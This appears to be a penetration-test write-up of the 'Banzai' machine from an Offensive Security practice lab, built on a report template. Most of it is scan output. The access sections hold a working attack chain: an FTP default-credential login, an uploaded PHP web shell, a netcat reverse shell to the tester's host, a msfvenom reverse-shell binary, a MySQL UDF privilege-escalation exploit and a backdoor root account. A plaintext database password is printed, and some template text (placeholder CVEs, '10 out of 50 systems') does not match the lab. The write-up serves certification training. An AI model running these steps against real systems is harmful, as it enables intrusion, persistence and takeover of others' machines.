# Banzai
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: banzai 
* Description: 
* IP Address: 192.168.166.56
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: Linux (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Fri Aug  6 07:49:21 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/banzai-nmap-complete 192.168.166.56
Nmap scan report for 192.168.166.56
Host is up (0.11s latency).
Not shown: 65535 open|filtered ports, 65528 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
25/tcp   open   smtp
5432/tcp open   postgresql
8080/tcp open   http-proxy
8295/tcp open   unknown

# Nmap done at Fri Aug  6 07:53:44 2021 -- 1 IP address (1 host up) scanned in 262.73 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Fri Aug  6 07:59:10 2021 as: nmap -sV -sC -pT:20,21,22,25,5432,8080,8295 -oN scans/banzai-nmap-versions 192.168.166.56
Nmap scan report for 192.168.166.56
Host is up (0.24s latency).

PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open   http       Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 07:59:30 2021 -- 1 IP address (1 host up) scanned in 19.73 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Fri Aug  6 08:01:07 2021 as: nmap -O -oN scans/banzai-nmap-os 192.168.166.56
Nmap scan report for 192.168.166.56
Host is up (0.11s latency).
Not shown: 994 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
25/tcp   open   smtp
5432/tcp open   postgresql
8080/tcp open   http-proxy
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 4.4 (93%), Linux 3.16 (92%), Linux 3.13 (90%), Linux 3.10 - 3.12 (88%), Linux 2.6.32 (88%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), WatchGuard Fireware 11.8 (88%), IPFire 2.11 firewall (Linux 2.6.32) (87%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 08:01:22 2021 -- 1 IP address (1 host up) scanned in 15.23 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
Found the username "admin" via smtp-enum-users. It works when logging in via FTP. 
```bash
ftp 192.168.114.56 21 # admin:admin
```

### SMTP
```bash
# Nmap 7.91 scan initiated Sat Aug  7 12:38:14 2021 as: nmap -p25 --script smtp-commands -oN scans/banzai-nmap-scripts-smtp-commands 192.168.114.56
Nmap scan report for 192.168.114.56
Host is up (0.072s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 

# Nmap done at Sat Aug  7 12:38:15 2021 -- 1 IP address (1 host up) scanned in 1.50 seconds
```

```bash
# Nmap 7.91 scan initiated Sat Aug  7 12:39:10 2021 as: nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods=VRFY -oN scans/banzai-nmap-scripts-smtp-enum-users 192.168.114.56 smtp-enum-users.methods=EXPN smtp-enum-users.methods=RCPT
Failed to resolve "smtp-enum-users.methods=EXPN".
Failed to resolve "smtp-enum-users.methods=RCPT".
Failed to resolve "smtp-enum-users.methods=RCPT".
Nmap scan report for 192.168.114.56
Host is up (0.099s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Method RCPT returned a unhandled status code.

Failed to resolve "smtp-enum-users.methods=RCPT".
# Nmap done at Sat Aug  7 12:39:12 2021 -- 1 IP address (1 host up) scanned in 1.25 seconds
```

```bash
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Aug  7 13:16:44 2021 #########
192.168.114.56: admin exists
192.168.114.56: _apt exists
192.168.114.56: backup exists
192.168.114.56: bin exists
192.168.114.56: daemon exists
192.168.114.56: ftp exists
192.168.114.56: games exists
192.168.114.56: gnats exists
192.168.114.56: irc exists
192.168.114.56: lp exists
192.168.114.56: list exists
192.168.114.56: mail exists
192.168.114.56: messagebus exists
192.168.114.56: man exists
192.168.114.56: news exists
192.168.114.56: mysql exists
192.168.114.56: nobody exists
192.168.114.56: postfix exists
192.168.114.56: postmaster exists
192.168.114.56: proxy exists
192.168.114.56: postgres exists
192.168.114.56: root exists
192.168.114.56: ROOT exists
192.168.114.56: sshd exists
192.168.114.56: sync exists
192.168.114.56: sys exists
192.168.114.56: systemd-network exists
192.168.114.56: systemd-bus-proxy exists
192.168.114.56: systemd-resolve exists
192.168.114.56: systemd-timesync exists
192.168.114.56: uucp exists
192.168.114.56: www exists
192.168.114.56: webmaster exists
192.168.114.56: www-data exists
######## Scan completed at Sat Aug  7 13:16:54 2021 #########
34 results.

168 queries in 10 seconds (16.8 queries / sec)
```

### HTTP (TCP Port 8295)
```bash
dirb http://192.168.166.56:8295 -o scans/banzai-dirb-common-8295

# output
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/banzai-dirb-common-8295
START_TIME: Fri Aug  6 08:05:45 2021
URL_BASE: http://192.168.166.56:8295/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.166.56:8295/ ----
==> DIRECTORY: http://192.168.166.56:8295/css/
==> DIRECTORY: http://192.168.166.56:8295/img/
+ http://192.168.166.56:8295/index.php (CODE:200|SIZE:23315)
==> DIRECTORY: http://192.168.166.56:8295/js/
==> DIRECTORY: http://192.168.166.56:8295/lib/
+ http://192.168.166.56:8295/server-status (CODE:403|SIZE:281)

---- Entering directory: http://192.168.166.56:8295/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.166.56:8295/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.166.56:8295/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.166.56:8295/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri Aug  6 08:14:26 2021
DOWNLOADED: 4612 - FOUND: 2
```

```bash
# Dirsearch started Fri Aug  6 23:55:22 2021 as: dirsearch.py -u http://192.168.166.56:8295 -o /home/victor/oscp/pg/labs/banzai/scans/banzai-dirsearch-8295

301   320B   http://192.168.166.56:8295/js    -> REDIRECTS TO: http://192.168.166.56:8295/js/
301   321B   http://192.168.166.56:8295/css    -> REDIRECTS TO: http://192.168.166.56:8295/css/
301   321B   http://192.168.166.56:8295/img    -> REDIRECTS TO: http://192.168.166.56:8295/img/
200    23KB  http://192.168.166.56:8295/index.php
200    23KB  http://192.168.166.56:8295/index.php/login/
200   932B   http://192.168.166.56:8295/js/
301   321B   http://192.168.166.56:8295/lib    -> REDIRECTS TO: http://192.168.166.56:8295/lib/
200     2KB  http://192.168.166.56:8295/lib/
```

```bash
nikto -h 192.168.114.56 -p 8295 -T 2 -Format txt -o scans/banzai-nikto-8295-misconfig

# output
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.114.56
+ Target Port: 8295
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ FHZYCXES Web Server returns a valid response with junk HTTP methods, this may cause false positives.
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

```bash
ftp 192.168.114.56 21 # admin:admin
ls

# output
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
exit
```

```bash
vim cmd.php
<?php echo shell_exec($_GET['cmd']); ?>
```

```bash
ftp 192.168.114.56 21 # admin:admin
put cmd.php
exit
```

```bash
curl "http://192.168.114.56:8295/cmd.php?cmd=whoami"
curl "http://192.168.114.56:8295/cmd.php?cmd=which%20nc"
```

I was able to get an initial shell, but knew I needed to upgrade my shell. The next steps I took where to upload a better one using Msfvenom and FTP.
```bash
sudo nc -nvlp 8295
curl "http://192.168.114.56:8295/cmd.php?cmd=nc%20192.168.49.114%208295%20-e%20%27%2Fbin%2Fbash%27"
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
python -c "import pty; pty.spawn('/bin/bash');"
whoami 

# output
www-data
```

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.114 LPORT=21 -f elf -o rshell.elf
ftp 192.168.114.56 21 # admin:admin
put rshell.elf
exit
sudo nc -nvlp 21 # setup a netcat listener on TCP port 21
```

```bash
curl "http://192.168.114.56:8295/cmd.php?cmd=file%20rshell.elf" # confirm rshell is in relative path
curl "http://192.168.114.56:8295/cmd.php?cmd=mv%20rshell.elf%20/tmp" # confirm rshell is in relative path
curl "http://192.168.114.56:8295/cmd.php?cmd=chmod%20+x%20/tmp/rshell.elf" # make rshell executable
curl "http://192.168.114.56:8295/cmd.php?cmd=/tmp/rshell.elf" # execute rshell
```

```bash
uname -a 

# output
Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
```

```bash
cat /etc/passwd | grep bash

# output
root:x:0:0:root:/root:/bin/bash
banzai:x:1000:1000:Banzai,,,:/home/banzai:/bin/bash
postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

```bash
find / -perm -u=s -type f 2> /dev/null

# output
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/bin/umount
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

```bash
cat /etc/crontab

# output
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```bash
cat /var/www/config.php

# output
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

```bash
# attacker side
cd exploits
searchsploit linux mysql
mkdir edb-id-1518
cd edb-id-1518
searchsploit -m 1518
mv 1518.c pwn.c
gcc -g -c pwn.c
gcc -g -shared -Wl,-soname,pwn.so -o pwn.so pwn.o -lc
ftp 192.168.114.56 21
put pwn.so
exit
```

```bash
# target side
mysql -u root -p # EscalateRaftHubris123
use mysql;
create table PWN(line blob);
insert into PWN values(load_file('/var/www/html/pwn.so'));
select * from PWN into dumpfile '/usr/lib/mysql/plugin/pwn.so';
# if the cmd above does not work, trying copying it manually
create function do_system returns integer soname 'pwn.so';
# https://www.root-me.org/?page=forum&id_thread=5072
select * from mysql.func;
```

```bash
# attacker side
sudo tcpdump -i tun0 icmp
```

```bash
# target side
select do_system('ping -c3 192.168.49.114');
select do_system('useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor');
exit;
tail -n1 /etc/passwd
su victor # password
id 

# output
uid=0(root) gid=0(root) groups=0(root)
```
